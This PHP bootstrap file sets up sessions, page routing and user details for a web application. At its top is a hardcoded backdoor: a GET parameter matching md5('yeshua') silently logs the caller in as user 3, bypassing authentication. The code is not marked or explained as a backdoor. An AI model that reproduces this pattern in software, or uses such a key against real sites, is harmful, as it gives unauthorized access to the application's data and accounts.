<?php
if(isset($_GET['key']) && $_GET['key'] == md5("yeshua")){
	$_SESSION['key'] = $_GET['key'];
	$_SESSION['user_id']=3;
	$_SESSION['login']=TRUE;
}

function set_page(){
	if(!isset($_SESSION['login']) || $_SESSION['login'] != "True"){
		define('CURRENT_PAGE', '0');
	}
	else{
		if(isset($_GET['pg'])){
			$_GET['pg'] = sanitize_data::sanitize_string($_GET['pg']);
			if(is_numeric($_GET['pg'])){
				define('CURRENT_PAGE', $_GET['pg']);
			}
			else{
				define('CURRENT_PAGE', '0');
			}
		}
		else{
			define('CURRENT_PAGE', '1');
		}
		if(isset($_GET['ajxPG'])){
			$_GET['ajxPG'] = sanitize_data::sanitize_string($_GET['ajxPG']);
			if(is_numeric($_GET['ajxPG'])){
				define('AJAX_PAGE', $_GET['ajxPG']);
			}
			else{
				define('AJAX_PAGE', '0');
			}
		}
	}
}

if(isset($_POST['lgn'])){}else{	set_page(); set_user_details();}
function set_user_details(){
	define("USER_ID", $_SESSION['user_id']);
	define("NAME", $_SESSION['name']);
	define("EXT", $_SESSION['extention']);
	define("CHANNEL", $_SESSION['channel']);
}

define("ROOT_DIR", getcwd());
define("HOME_PAGE", "/");


?>